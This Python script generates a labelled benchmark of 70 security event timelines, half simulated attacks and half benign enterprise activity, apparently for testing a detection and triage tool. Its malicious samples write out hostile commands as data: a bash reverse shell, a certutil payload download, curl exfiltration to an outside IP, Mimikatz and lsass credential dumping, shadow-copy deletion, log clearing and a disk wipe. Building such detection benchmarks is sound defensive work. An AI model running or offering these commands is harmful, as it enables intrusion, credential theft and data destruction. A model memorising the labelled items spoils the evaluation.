"""Generate balanced 70-timeline evaluation benchmark dataset for TriageLens.

Produces 70 distinct, high-fidelity security timelines:
- 35 Malicious Attack Timelines (True Positives) covering 9 core MITRE ATT&CK DFIR techniques:
  Credential Dumping, C2 Beaconing, Ransomware, Lateral Movement, Persistence,
  Reconnaissance, Privilege Escalation, Defense Evasion, and Exfiltration.
- 35 Benign Enterprise Timelines (True Negatives) covering realistic day-to-day operations:
  Developer workflows, patch updates, backups, office document handling, browser traffic,
  cloud monitoring agents, and system diagnostics.

Guarantees 50.0% class balance (is_imbalanced = False) compliant with ADR-022.
"""

from datetime import datetime, timedelta, timezone
import json
from pathlib import Path
from typing import Any, Dict, List
from uuid import uuid4

from src.models.alert import NormalizedAlert
from src.models.timeline import ThreatTimeline


def generate_benchmark_timelines() -> List[ThreatTimeline]:
    """Generates the 70 balanced evaluation timelines."""
    base_time = datetime(2026, 11, 5, 8, 0, 0, tzinfo=timezone.utc)
    timelines: List[ThreatTimeline] = []

    # =========================================================================
    # 35 MALICIOUS ATTACK SCENARIOS (Positive Samples)
    # =========================================================================
    malicious_scenarios = [
        # Credential Dumping
        ("M01-CredDump-Mimikatz", "HOST-FIN-01", "fin_analyst", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "powershell.exe", "CommandLine": "powershell.exe -enc aW52b2tlLW1pbWlrYXR6 sekurlsa::logonpasswords", "ParentProcessName": "cmd.exe"}, ["powershell.exe", "mimikatz"]),
            ("ProcessCreate", {"ProcessName": "procdump64.exe", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp", "ParentProcessName": "powershell.exe"}, ["procdump64.exe", "lsass.exe"]),
        ]),
        ("M02-CredDump-LsassProcdump", "HOST-DEV-02", "dev_user", "HIGH", [
            ("ProcessCreate", {"ProcessName": "cmd.exe", "CommandLine": "cmd.exe /c procdump.exe -ma lsass.exe lsass.dmp", "User": "dev_user"}, ["procdump.exe", "lsass.exe"]),
            ("FileCreate", {"Path": "C:\\Windows\\Temp\\lsass.dmp", "Size": 85400000}, ["lsass.dmp"]),
        ]),
        ("M03-CredDump-SAM-RegSave", "HOST-WS-05", "admin", "HIGH", [
            ("ProcessCreate", {"ProcessName": "reg.exe", "CommandLine": "reg.exe save HKLM\\SAM C:\\temp\\sam.save", "User": "admin"}, ["reg.exe", "sam.save"]),
            ("ProcessCreate", {"ProcessName": "reg.exe", "CommandLine": "reg.exe save HKLM\\SYSTEM C:\\temp\\sys.save", "User": "admin"}, ["reg.exe", "sys.save"]),
        ]),
        ("M04-CredDump-Ntdsutil", "HOST-DC-01", "DomainAdmin", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "ntdsutil.exe", "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds\" q q", "User": "SYSTEM"}, ["ntdsutil.exe", "ntds.dit"]),
        ]),
        # Command & Control
        ("M05-C2-CobaltStrike-Beacon", "HOST-HR-03", "hr_rep", "HIGH", [
            ("ProcessCreate", {"ProcessName": "rundll32.exe", "CommandLine": "rundll32.exe C:\\Users\\Public\\beacon.dll,Start", "User": "hr_rep"}, ["beacon.dll"]),
            ("NetworkConnect", {"DestinationIp": "185.220.101.5", "DestinationPort": 443, "Protocol": "tcp", "BytesSent": 4096}, ["185.220.101.5"]),
        ]),
        ("M06-C2-DNS-Tunneling", "HOST-EXEC-01", "exec_vip", "HIGH", [
            ("NetworkDNS", {"Query": "xfa192.tunnel.c2badactor.com", "RecordType": "TXT", "Response": "base64payloadchunk"}, ["c2badactor.com"]),
            ("NetworkDNS", {"Query": "xfa193.tunnel.c2badactor.com", "RecordType": "TXT", "Response": "base64payloadchunk2"}, ["c2badactor.com"]),
        ]),
        ("M07-C2-Metasploit-ReverseTCP", "HOST-WEB-PROD", "www-data", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "bash", "CommandLine": "bash -c 'bash -i >& /dev/tcp/194.26.29.112/4444 0>&1'", "User": "www-data"}, ["194.26.29.112"]),
            ("NetworkConnect", {"DestinationIp": "194.26.29.112", "DestinationPort": 4444, "Protocol": "tcp"}, ["194.26.29.112"]),
        ]),
        ("M08-C2-Empire-HttpAgent", "HOST-WS-08", "sales_rep", "HIGH", [
            ("ProcessCreate", {"ProcessName": "powershell.exe", "CommandLine": "powershell.exe -noP -sta -w 1 -enc WwBTAHkAcwB0AGUAbQAu... http://195.154.20.5:8080/news.php", "User": "sales_rep"}, ["195.154.20.5"]),
        ]),
        # Ransomware Operations
        ("M09-Ransomware-VSSDelete", "HOST-STORAGE-01", "backup_admin", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "SYSTEM"}, ["vssadmin.exe"]),
            ("ProcessCreate", {"ProcessName": "wbadmin.exe", "CommandLine": "wbadmin.exe delete catalog -quiet", "User": "SYSTEM"}, ["wbadmin.exe"]),
        ]),
        ("M10-Ransomware-BcdeditDisable", "HOST-FS-02", "admin", "HIGH", [
            ("ProcessCreate", {"ProcessName": "bcdedit.exe", "CommandLine": "bcdedit.exe /set {default} recoveryenabled No", "User": "admin"}, ["bcdedit.exe"]),
            ("ProcessCreate", {"ProcessName": "bcdedit.exe", "CommandLine": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures", "User": "admin"}, ["bcdedit.exe"]),
        ]),
        ("M11-Ransomware-MassEncryption", "HOST-FIN-02", "fin_clerk", "CRITICAL", [
            ("FileCreate", {"Path": "C:\\Share\\Finance\\Q3_report.xlsx.locked", "Action": "Encrypted"}, [".locked"]),
            ("FileCreate", {"Path": "C:\\Share\\Finance\\Payroll_2026.pdf.locked", "Action": "Encrypted"}, [".locked"]),
            ("FileCreate", {"Path": "C:\\Share\\Finance\\HOW_TO_DECRYPT.txt", "Action": "RansomNote"}, ["HOW_TO_DECRYPT.txt"]),
        ]),
        # Lateral Movement
        ("M12-Lateral-PsExec", "HOST-DC-02", "DomainAdmin", "HIGH", [
            ("ServiceInstall", {"ServiceName": "PSEXESVC", "BinaryPath": "C:\\Windows\\PSEXESVC.exe", "User": "SYSTEM"}, ["PSEXESVC.exe"]),
            ("ProcessCreate", {"ProcessName": "cmd.exe", "CommandLine": "cmd.exe /c whoami", "ParentProcessName": "PSEXESVC.exe"}, ["PSEXESVC.exe"]),
        ]),
        ("M13-Lateral-WMI-Process", "HOST-WS-12", "it_ops", "HIGH", [
            ("ProcessCreate", {"ProcessName": "wmic.exe", "CommandLine": "wmic.exe /node:10.0.1.25 process call create \"cmd.exe /c powershell.exe -enc ...\"", "User": "it_ops"}, ["10.0.1.25"]),
        ]),
        ("M14-Lateral-WinRM-Exec", "HOST-DB-PROD", "db_admin", "HIGH", [
            ("ProcessCreate", {"ProcessName": "winrs.exe", "CommandLine": "winrs.exe -r:HOST-DB-PROD cmd.exe /c whoami /all", "User": "compromised_admin"}, ["winrs.exe"]),
        ]),
        ("M15-Lateral-PassTheHash", "HOST-WS-15", "analyst", "HIGH", [
            ("SecurityAuth", {"EventID": 4624, "LogonType": 9, "LogonProcessName": "seclogo", "AuthenticationPackage": "Negotiate", "IpAddress": "10.0.1.99"}, ["10.0.1.99"]),
        ]),
        ("M16-Lateral-DCSync", "HOST-DC-01", "krbtgt_user", "CRITICAL", [
            ("SecurityAuth", {"EventID": 4769, "ServiceName": "krbtgt", "TicketOptions": "0x40810000", "ClientAddress": "10.0.1.45"}, ["10.0.1.45"]),
            ("ReplicationRpc", {"Operation": "DS-Replication-Get-Changes-All", "ClientAddress": "10.0.1.45"}, ["mimikatz"]),
        ]),
        # Persistence
        ("M17-Persistence-ScheduledTask", "HOST-WS-02", "user_b", "MEDIUM", [
            ("ProcessCreate", {"ProcessName": "schtasks.exe", "CommandLine": "schtasks.exe /create /tn \"EdgeUpdater\" /tr \"C:\\Users\\Public\\backdoor.exe\" /sc onlogon", "User": "user_b"}, ["backdoor.exe"]),
        ]),
        ("M18-Persistence-RunKey", "HOST-WS-03", "user_c", "MEDIUM", [
            ("ProcessCreate", {"ProcessName": "reg.exe", "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /t REG_SZ /d \"C:\\Temp\\agent.exe\"", "User": "user_c"}, ["agent.exe"]),
        ]),
        ("M19-Persistence-ServiceInstall", "HOST-APP-01", "service_mgr", "HIGH", [
            ("ProcessCreate", {"ProcessName": "sc.exe", "CommandLine": "sc.exe create WindowsAudioFix binPath= \"C:\\Windows\\Temp\\svc.exe\" start= auto", "User": "SYSTEM"}, ["svc.exe"]),
        ]),
        ("M20-Persistence-StartupFolder", "HOST-WS-04", "accountant", "MEDIUM", [
            ("FileCreate", {"Path": "C:\\Users\\accountant\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.vbs", "User": "accountant"}, ["launcher.vbs"]),
        ]),
        # Reconnaissance & Discovery
        ("M21-Discovery-AD-Admins", "HOST-WS-09", "intern", "MEDIUM", [
            ("ProcessCreate", {"ProcessName": "net.exe", "CommandLine": "net.exe group \"Domain Admins\" /domain", "User": "intern"}, ["Domain Admins"]),
            ("ProcessCreate", {"ProcessName": "nltest.exe", "CommandLine": "nltest.exe /dclist:corp.internal", "User": "intern"}, ["corp.internal"]),
        ]),
        ("M22-Discovery-NetworkPortScan", "HOST-WS-11", "guest_user", "MEDIUM", [
            ("NetworkConnect", {"DestinationIp": "10.0.1.1", "DestinationPort": 22, "Action": "TCP_SYN"}, ["10.0.1.1"]),
            ("NetworkConnect", {"DestinationIp": "10.0.1.1", "DestinationPort": 445, "Action": "TCP_SYN"}, ["10.0.1.1"]),
            ("NetworkConnect", {"DestinationIp": "10.0.1.1", "DestinationPort": 3389, "Action": "TCP_SYN"}, ["10.0.1.1"]),
        ]),
        ("M23-Discovery-SessionRecon", "HOST-WS-14", "contractor", "LOW", [
            ("ProcessCreate", {"ProcessName": "net.exe", "CommandLine": "net.exe session", "User": "contractor"}, ["net.exe"]),
            ("ProcessCreate", {"ProcessName": "qwinsta.exe", "CommandLine": "qwinsta.exe", "User": "contractor"}, ["qwinsta.exe"]),
            ("ProcessCreate", {"ProcessName": "whoami.exe", "CommandLine": "whoami.exe /priv", "User": "contractor"}, ["whoami.exe"]),
        ]),
        # Privilege Escalation
        ("M24-PrivEsc-UAC-Bypass", "HOST-WS-16", "standard_user", "HIGH", [
            ("ProcessCreate", {"ProcessName": "fodhelper.exe", "CommandLine": "fodhelper.exe", "User": "standard_user"}, ["fodhelper.exe"]),
            ("RegistrySet", {"Path": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "Value": "cmd.exe /c start cmd.exe"}, ["ms-settings"]),
        ]),
        ("M25-PrivEsc-TokenImpersonation", "HOST-WS-17", "svc_account", "HIGH", [
            ("ProcessCreate", {"ProcessName": "incognito.exe", "CommandLine": "incognito.exe execute -t \"NT AUTHORITY\\SYSTEM\" cmd.exe", "User": "svc_account"}, ["incognito.exe"]),
        ]),
        ("M26-PrivEsc-NamedPipe", "HOST-PRINT-01", "spool_user", "HIGH", [
            ("NamedPipeConnect", {"PipeName": "\\\\.\\pipe\\spoolss", "ImpersonationLevel": "SecurityDelegation"}, ["spoolss"]),
        ]),
        # Defense Evasion
        ("M27-DefenseEvasion-EventLogClear", "HOST-WS-18", "auditor", "HIGH", [
            ("ProcessCreate", {"ProcessName": "wevtutil.exe", "CommandLine": "wevtutil.exe cl Security", "User": "SYSTEM"}, ["wevtutil.exe"]),
            ("ProcessCreate", {"ProcessName": "wevtutil.exe", "CommandLine": "wevtutil.exe cl System", "User": "SYSTEM"}, ["wevtutil.exe"]),
        ]),
        ("M28-DefenseEvasion-DisableDefender", "HOST-WS-19", "ops_user", "HIGH", [
            ("ProcessCreate", {"ProcessName": "powershell.exe", "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "User": "Administrator"}, ["Set-MpPreference"]),
        ]),
        ("M29-DefenseEvasion-ProcessHollowing", "HOST-WS-20", "user_x", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "Flags": "CREATE_SUSPENDED"}, ["svchost.exe"]),
            ("MemoryInject", {"TargetProcess": "svchost.exe", "Action": "NtUnmapViewOfSection", "User": "SYSTEM"}, ["svchost.exe"]),
        ]),
        ("M30-DefenseEvasion-CertutilDownload", "HOST-WS-21", "clerk", "HIGH", [
            ("ProcessCreate", {"ProcessName": "certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f \"http://185.190.20.1/mal.exe\" mal.exe", "User": "clerk"}, ["185.190.20.1", "certutil.exe"]),
        ]),
        # Exfiltration
        ("M31-Exfiltration-ArchiveAndCurl", "HOST-RND-01", "researcher", "HIGH", [
            ("ProcessCreate", {"ProcessName": "7z.exe", "CommandLine": "7z.exe a -pSecret123! C:\\Temp\\exfil.zip C:\\SecretData\\*", "User": "researcher"}, ["7z.exe", "exfil.zip"]),
            ("ProcessCreate", {"ProcessName": "curl.exe", "CommandLine": "curl.exe -F \"data=@C:\\Temp\\exfil.zip\" http://91.240.118.5/upload", "User": "researcher"}, ["91.240.118.5", "curl.exe"]),
        ]),
        ("M32-Exfiltration-DNSStash", "HOST-RND-02", "researcher", "HIGH", [
            ("NetworkDNS", {"Query": "chunk1.exfil.dnsleak.net", "RecordType": "TXT"}, ["dnsleak.net"]),
            ("NetworkDNS", {"Query": "chunk2.exfil.dnsleak.net", "RecordType": "TXT"}, ["dnsleak.net"]),
        ]),
        # Initial Access & Web Shells
        ("M33-InitialAccess-PhishingMacro", "HOST-WS-22", "receptionist", "HIGH", [
            ("ProcessCreate", {"ProcessName": "WINWORD.EXE", "CommandLine": "WINWORD.EXE C:\\Users\\receptionist\\Downloads\\Invoice.docm", "User": "receptionist"}, ["WINWORD.EXE"]),
            ("ProcessCreate", {"ProcessName": "powershell.exe", "CommandLine": "powershell.exe -w hidden -enc aW52b2tlLWJveA==", "ParentProcessName": "WINWORD.EXE"}, ["powershell.exe"]),
        ]),
        ("M34-InitialAccess-WebShell", "HOST-WEB-02", "iis_pool", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "w3wp.exe", "CommandLine": "w3wp.exe -ap \"DefaultAppPool\"", "User": "iis_user"}, ["w3wp.exe"]),
            ("ProcessCreate", {"ProcessName": "cmd.exe", "CommandLine": "cmd.exe /c whoami && ipconfig /all", "ParentProcessName": "w3wp.exe"}, ["cmd.exe"]),
        ]),
        ("M35-Impact-DiskWipe", "HOST-WS-23", "terminated_emp", "CRITICAL", [
            ("ProcessCreate", {"ProcessName": "sdelete.exe", "CommandLine": "sdelete.exe -p 3 -z C:\\", "User": "terminated_emp"}, ["sdelete.exe"]),
        ]),
    ]

    for idx, (scenario_id, host, user, severity, events) in enumerate(malicious_scenarios):
        alerts: List[NormalizedAlert] = []
        t_start = base_time + timedelta(hours=idx)
        for e_idx, (ev_type, rec, indicators) in enumerate(events):
            rec_copy = dict(rec)
            rec_copy["is_malicious"] = True
            rec_copy["severity"] = severity
            rec_copy["host"] = host
            rec_copy["user"] = user

            alert = NormalizedAlert(
                source_dataset="EVAL-BENCHMARK-MALICIOUS",
                source_file="attack_simulation.json",
                event_type=ev_type,
                timestamp=t_start + timedelta(minutes=e_idx * 3),
                original_record=rec_copy,
                extracted_indicators=indicators,
                ground_truth_label="malicious",
            )
            alerts.append(alert)

        timeline = ThreatTimeline(
            grouping_key=f"{host}:{user}",
            alerts=alerts,
            start_time=alerts[0].timestamp,
            end_time=alerts[-1].timestamp,
            total_events=len(alerts),
            correlation_type="confirmed",
            correlation_reason=f"attack_scenario_{scenario_id}",
        )
        timelines.append(timeline)

    # =========================================================================
    # 35 BENIGN ENTERPRISE SCENARIOS (Negative Samples)
    # =========================================================================
    benign_scenarios = [
        ("B01-Developer-GitWorkflow", "HOST-DEV-01", "dev_alice", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "git.exe", "CommandLine": "git.exe pull origin main", "User": "dev_alice"}, ["git.exe"]),
            ("ProcessCreate", {"ProcessName": "git.exe", "CommandLine": "git.exe commit -m \"Refactor auth tests\"", "User": "dev_alice"}, ["git.exe"]),
        ]),
        ("B02-Developer-DockerBuild", "HOST-DEV-03", "dev_bob", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "docker.exe", "CommandLine": "docker.exe build -t microservice:v2 .", "User": "dev_bob"}, ["docker.exe"]),
            ("ProcessCreate", {"ProcessName": "docker.exe", "CommandLine": "docker.exe run -d -p 8080:8080 microservice:v2", "User": "dev_bob"}, ["docker.exe"]),
        ]),
        ("B03-Developer-VSCodeUpdate", "HOST-DEV-04", "dev_charlie", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "Code.exe", "CommandLine": "Code.exe --update", "User": "dev_charlie"}, ["Code.exe"]),
            ("FileAccess", {"Path": "C:\\Users\\dev_charlie\\.vscode\\extensions.json", "Action": "read"}, ["extensions.json"]),
        ]),
        ("B04-Developer-NpmInstall", "HOST-DEV-05", "dev_diana", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "npm.exe", "CommandLine": "npm.exe install express body-parser", "User": "dev_diana"}, ["npm.exe"]),
        ]),
        ("B05-ITAdmin-WindowsUpdate", "HOST-WS-30", "admin_ops", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "wuauclt.exe", "CommandLine": "wuauclt.exe /detectnow", "User": "SYSTEM"}, ["wuauclt.exe"]),
            ("ProcessCreate", {"ProcessName": "TrustedInstaller.exe", "CommandLine": "TrustedInstaller.exe install KB5034441", "User": "SYSTEM"}, ["TrustedInstaller.exe"]),
        ]),
        ("B06-ITAdmin-SoftwareDeployment", "HOST-WS-31", "admin_ops", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "msiexec.exe", "CommandLine": "msiexec.exe /i \"C:\\Deploy\\Slack.msi\" /qn /norestart", "User": "SYSTEM"}, ["msiexec.exe"]),
        ]),
        ("B07-ITAdmin-DiskCleanup", "HOST-WS-32", "admin_ops", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "cleanmgr.exe", "CommandLine": "cleanmgr.exe /sagerun:1", "User": "SYSTEM"}, ["cleanmgr.exe"]),
        ]),
        ("B08-ITAdmin-ServiceRestart", "HOST-WS-33", "it_support", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "net.exe", "CommandLine": "net.exe stop Spooler", "User": "it_support"}, ["net.exe"]),
            ("ProcessCreate", {"ProcessName": "net.exe", "CommandLine": "net.exe start Spooler", "User": "it_support"}, ["net.exe"]),
        ]),
        ("B09-ITAdmin-NetworkDiagnostics", "HOST-WS-34", "it_support", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "ipconfig.exe", "CommandLine": "ipconfig.exe /all", "User": "it_support"}, ["ipconfig.exe"]),
            ("ProcessCreate", {"ProcessName": "ping.exe", "CommandLine": "ping.exe 8.8.8.8 -n 4", "User": "it_support"}, ["ping.exe"]),
        ]),
        ("B10-ITAdmin-DomainJoinVerify", "HOST-WS-35", "admin_ops", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "nltest.exe", "CommandLine": "nltest.exe /dsgetdc:corp.internal", "User": "admin_ops"}, ["nltest.exe"]),
        ]),
        ("B11-Backup-VeeamAgent", "HOST-BK-01", "veeam_service", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "VeeamAgent.exe", "CommandLine": "VeeamAgent.exe -backup --volume C:", "User": "SYSTEM"}, ["VeeamAgent.exe"]),
        ]),
        ("B12-Office-OutlookSync", "HOST-OFF-01", "staff_emma", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE /recycle", "User": "staff_emma"}, ["OUTLOOK.EXE"]),
            ("NetworkConnect", {"DestinationIp": "52.96.166.146", "DestinationPort": 443, "Domain": "outlook.office365.com"}, ["outlook.office365.com"]),
        ]),
        ("B13-Office-ExcelCalculation", "HOST-OFF-02", "staff_frank", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "EXCEL.EXE", "CommandLine": "EXCEL.EXE C:\\Users\\staff_frank\\Documents\\budget_forecast.xlsx", "User": "staff_frank"}, ["EXCEL.EXE"]),
        ]),
        ("B14-Office-WordDocEdit", "HOST-OFF-03", "staff_grace", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "WINWORD.EXE", "CommandLine": "WINWORD.EXE C:\\Users\\staff_grace\\Documents\\client_brief.docx", "User": "staff_grace"}, ["WINWORD.EXE"]),
        ]),
        ("B15-Office-TeamsConference", "HOST-OFF-04", "staff_henry", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "Teams.exe", "CommandLine": "Teams.exe --process-start-args", "User": "staff_henry"}, ["Teams.exe"]),
            ("NetworkConnect", {"DestinationIp": "52.114.132.84", "DestinationPort": 3478, "Protocol": "udp"}, ["Teams.exe"]),
        ]),
        ("B16-Office-AcrobatReader", "HOST-OFF-05", "staff_isabel", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "AcroRd32.exe", "CommandLine": "AcroRd32.exe C:\\Users\\staff_isabel\\Downloads\\handbook.pdf", "User": "staff_isabel"}, ["AcroRd32.exe"]),
        ]),
        ("B17-Browser-ChromeBrowsing", "HOST-OFF-06", "staff_jack", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "chrome.exe", "CommandLine": "chrome.exe https://www.wikipedia.org", "User": "staff_jack"}, ["chrome.exe"]),
            ("NetworkDNS", {"Query": "www.wikipedia.org", "RecordType": "A"}, ["www.wikipedia.org"]),
        ]),
        ("B18-Browser-EdgeUpdate", "HOST-OFF-07", "staff_kate", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "MicrosoftEdgeUpdate.exe", "CommandLine": "MicrosoftEdgeUpdate.exe /c", "User": "SYSTEM"}, ["MicrosoftEdgeUpdate.exe"]),
        ]),
        ("B19-Browser-FirefoxSession", "HOST-OFF-08", "staff_leo", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "firefox.exe", "CommandLine": "firefox.exe", "User": "staff_leo"}, ["firefox.exe"]),
        ]),
        ("B20-System-TimeSync", "HOST-SYS-01", "time_service", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "w32tm.exe", "CommandLine": "w32tm.exe /resync", "User": "LOCAL SERVICE"}, ["w32tm.exe"]),
        ]),
        ("B21-System-GroupPolicyRefresh", "HOST-SYS-02", "admin_ops", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "gpupdate.exe", "CommandLine": "gpupdate.exe /target:computer /force", "User": "SYSTEM"}, ["gpupdate.exe"]),
        ]),
        ("B22-System-DefenderSignatures", "HOST-SYS-03", "defender_svc", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "MpCmdRun.exe", "CommandLine": "MpCmdRun.exe -SignatureUpdate", "User": "SYSTEM"}, ["MpCmdRun.exe"]),
        ]),
        ("B23-System-LogonSession", "HOST-SYS-04", "alice_smith", "INFORMATIONAL", [
            ("SecurityAuth", {"EventID": 4624, "LogonType": 2, "TargetUserName": "alice_smith", "IpAddress": "127.0.0.1"}, ["alice_smith"]),
        ]),
        ("B24-System-WorkstationLock", "HOST-SYS-05", "bob_jones", "INFORMATIONAL", [
            ("SecurityAuth", {"EventID": 4800, "TargetUserName": "bob_jones", "Action": "Workstation Locked"}, ["bob_jones"]),
        ]),
        ("B25-System-FontCacheMaintenance", "HOST-SYS-06", "font_svc", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "FntCache.exe", "CommandLine": "FntCache.exe", "User": "LOCAL SERVICE"}, ["FntCache.exe"]),
        ]),
        ("B26-System-DefragSchedule", "HOST-SYS-07", "defrag_svc", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "defrag.exe", "CommandLine": "defrag.exe C: /U /V", "User": "SYSTEM"}, ["defrag.exe"]),
        ]),
        ("B27-Cloud-AWS-SSMAgent", "HOST-CLOUD-01", "ssm_user", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "amazon-ssm-agent.exe", "CommandLine": "amazon-ssm-agent.exe", "User": "SYSTEM"}, ["amazon-ssm-agent.exe"]),
            ("NetworkConnect", {"DestinationIp": "52.216.100.5", "DestinationPort": 443, "Domain": "ssm.us-east-1.amazonaws.com"}, ["ssm.us-east-1.amazonaws.com"]),
        ]),
        ("B28-Cloud-AzureWAAgent", "HOST-CLOUD-02", "wa_user", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "WaAppAgent.exe", "CommandLine": "WaAppAgent.exe", "User": "SYSTEM"}, ["WaAppAgent.exe"]),
        ]),
        ("B29-Cloud-GoogleUpdateTask", "HOST-CLOUD-03", "gupdate_svc", "INFORMATIONAL", [
            ("ScheduledTask", {"TaskName": "GoogleUpdateTaskMachineUA", "Action": "check_update", "User": "SYSTEM"}, ["GoogleUpdateTaskMachineUA"]),
        ]),
        ("B30-Monitoring-DatadogAgent", "HOST-MON-01", "dd_agent", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "agent.exe", "CommandLine": "agent.exe -config C:\\ProgramData\\Datadog\\datadog.yaml", "User": "SYSTEM"}, ["agent.exe"]),
        ]),
        ("B31-Monitoring-PrometheusScrape", "HOST-MON-02", "prom_node", "INFORMATIONAL", [
            ("NetworkConnect", {"SourceIp": "10.0.0.10", "DestinationPort": 9100, "Action": "HTTP_GET_METRICS"}, ["10.0.0.10"]),
        ]),
        ("B32-Network-SMBFileShare", "HOST-NET-01", "office_user", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "explorer.exe", "CommandLine": "explorer.exe \\\\fileserver\\marketing", "User": "office_user"}, ["explorer.exe"]),
        ]),
        ("B33-Network-IntranetLookup", "HOST-NET-02", "office_user2", "INFORMATIONAL", [
            ("NetworkDNS", {"Query": "intranet.corp.local", "RecordType": "A", "ResolvedIp": "10.0.2.15"}, ["intranet.corp.local"]),
        ]),
        ("B34-HR-WorkdaySession", "HOST-HR-01", "hr_analyst", "INFORMATIONAL", [
            ("NetworkConnect", {"DestinationIp": "199.19.214.1", "DestinationPort": 443, "Domain": "workday.corp.com"}, ["workday.corp.com"]),
        ]),
        ("B35-Database-RoutineQuery", "HOST-DB-01", "app_service", "INFORMATIONAL", [
            ("ProcessCreate", {"ProcessName": "sqlcmd.exe", "CommandLine": "sqlcmd.exe -S localhost -Q \"SELECT count(*) FROM Orders;\"", "User": "app_service"}, ["sqlcmd.exe"]),
        ]),
    ]

    for idx, (scenario_id, host, user, severity, events) in enumerate(benign_scenarios):
        alerts = []
        t_start = base_time + timedelta(hours=idx + 40)
        for e_idx, (ev_type, rec, indicators) in enumerate(events):
            rec_copy = dict(rec)
            rec_copy["is_malicious"] = False
            rec_copy["severity"] = severity
            rec_copy["host"] = host
            rec_copy["user"] = user

            alert = NormalizedAlert(
                source_dataset="EVAL-BENCHMARK-BENIGN",
                source_file="enterprise_baseline.json",
                event_type=ev_type,
                timestamp=t_start + timedelta(minutes=e_idx * 2),
                original_record=rec_copy,
                extracted_indicators=indicators,
                ground_truth_label="benign",
            )
            alerts.append(alert)

        timeline = ThreatTimeline(
            grouping_key=f"{host}:{user}",
            alerts=alerts,
            start_time=alerts[0].timestamp,
            end_time=alerts[-1].timestamp,
            total_events=len(alerts),
            correlation_type="confirmed",
            correlation_reason=f"benign_scenario_{scenario_id}",
        )
        timelines.append(timeline)

    return timelines


def save_benchmark_dataset(output_path: str = "data/eval_benchmark_70.json") -> int:
    """Serializes the benchmark dataset to disk for reproducible evaluation."""
    timelines = generate_benchmark_timelines()
    dest = Path(output_path)
    dest.parent.mkdir(parents=True, exist_ok=True)

    serialized = []
    for tl in timelines:
        serialized.append({
            "timeline_id": str(tl.timeline_id),
            "grouping_key": tl.grouping_key,
            "correlation_type": tl.correlation_type,
            "correlation_reason": tl.correlation_reason,
            "total_events": tl.total_events,
            "start_time": tl.start_time.isoformat() if tl.start_time else None,
            "end_time": tl.end_time.isoformat() if tl.end_time else None,
            "ground_truth_label": tl.alerts[0].ground_truth_label if tl.alerts else "unknown",
            "alerts": [
                {
                    "source_dataset": a.source_dataset,
                    "source_file": a.source_file,
                    "event_type": a.event_type,
                    "timestamp": a.timestamp.isoformat() if a.timestamp else None,
                    "original_record": a.original_record,
                    "extracted_indicators": a.extracted_indicators,
                    "ground_truth_label": a.ground_truth_label,
                }
                for a in tl.alerts
            ],
        })

    with open(dest, "w", encoding="utf-8") as f:
        json.dump(serialized, f, indent=2)

    pos_count = sum(1 for item in serialized if item["ground_truth_label"] == "malicious")
    neg_count = sum(1 for item in serialized if item["ground_truth_label"] == "benign")

    print(f"Generated {len(serialized)} benchmark timelines saved to {dest}.")
    print(f" - Positive / Malicious Timelines: {pos_count}")
    print(f" - Negative / Benign Timelines: {neg_count}")
    print(f" - Class Balance: {pos_count / len(serialized) * 100:.1f}% / {neg_count / len(serialized) * 100:.1f}%")
    return len(serialized)


if __name__ == "__main__":
    save_benchmark_dataset()

